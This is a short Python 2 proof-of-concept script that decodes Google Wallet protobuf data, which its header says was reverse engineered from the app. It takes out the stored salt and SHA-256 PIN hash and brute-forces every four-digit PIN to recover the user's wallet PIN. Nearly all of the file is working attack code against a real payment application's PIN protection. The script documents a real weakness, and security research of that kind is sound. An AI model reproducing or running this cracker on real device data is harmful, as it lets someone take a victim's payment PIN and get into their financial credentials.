#!/usr/bin/python

import binascii
import sys
import hashlib
import struct

"""
Author: Rajendra Umadas

The following code is a prototype. If you want to generically decode
protobuf data, use the protobuf_easy_decode module in this directory.

Much of the protobuf decoder code was written to solve this problem
in a generic way, which will allow decoding without the .proto file.

It can be difficult to create a .proto file from raw protobuf data and
can involve quite a bit of trial and error due to the nesting of 
class data and the way protobuf is designed to serialize data. 

To decode specific parts of the Google Wallet proto buf encoded data
 it was required to understand the ".proto" for Google Wallet. " This 
was derived by reverse engineering the Google Wallet application. 


"""

TYPE_VARINT = 0
TYPE_64 = 1
TYPE_LENGTHDELIM = 2
TYPE_STARTGROUP = 3
TYPE_ENDGROUP = 4
TYPE_32 = 5

def getVarintPos(stream):
    result = 0
    shifts = 0
    pos = 1
    for i in stream:
        result = result | ((ord(i)&0x7f) << shifts)
        if not (ord(i)&0x80):
            return result,pos
        shifts = shifts+7
        pos = pos+1

def getLengthdelimPos(stream):
    length,pos = getVarintPos(stream)
    stream = stream[pos:]
    string = stream[0:length]
    return string,pos+length

def getTagType(i):
    return (i>>3,i&0x07)

def getTypeName(i):
    if i == TYPE_VARINT:
        return "varint"
    elif i == TYPE_64:
        return "64 bit"
    elif i == TYPE_LENGTHDELIM:
        return "length delim"
    elif i == TYPE_32:
        return "32 bit"
    else:
        return "WTF"

def genDecodeProtoBuff(protoBin):
    allsGood = True
    theProtos =  {}
    while allsGood:
        if len(protoBin) == 0:
            return theProtos
        currentTagInt,pos = getVarintPos(protoBin)
        protoBin = protoBin[pos:]
        currentTag,currentType = getTagType(currentTagInt)
        if currentType == TYPE_LENGTHDELIM:
            data,pos = getLengthdelimPos(protoBin)
            protoBin = protoBin[pos:]
            
            theProtos[currentTag]=(currentType,data,genDecodeProtoBuff(data))
        elif currentType == TYPE_VARINT:
            data,pos = getVarintPos(protoBin)
            protoBin = protoBin[pos:]
            theProtos[currentTag]=(currentType,data,0)
        else:
            allsGood = False
    return theProtos

proto =  sys.argv[1]
protoBin = binascii.unhexlify(proto)

theData = genDecodeProtoBuff(protoBin) 
pinsalt = struct.unpack("q",struct.pack("Q",theData[3][2][1][1]))[0]
pinhash = theData[3][2][2][1]
pinBadAttempts = theData[3][2][3][1]
pinExpired = theData[3][2][4][1]
pinStateTransTS = theData[3][2][5][1]
pinStateTransDel = theData[3][2][6][1]

foundPin = False
testpins = ["%04d" % i for i in range(10000)]
for testpin in testpins:
    testhash = hashlib.sha256(testpin+str(pinsalt)).digest()
    if binascii.hexlify(testhash)==pinhash:
        foundPin = True
        break

print "Salt: " + str(pinsalt)
print "Hash: " + pinhash
print "Bad Attempts: " + str(pinBadAttempts)
print "Is Expired: " + str(pinExpired)
print "Trans TS: " + str(pinStateTransTS)
print "Trans Delta: " + str(pinStateTransDel)
if foundPin:
    print "Pin: " + testpin
else:
    print "F* the pin!!"
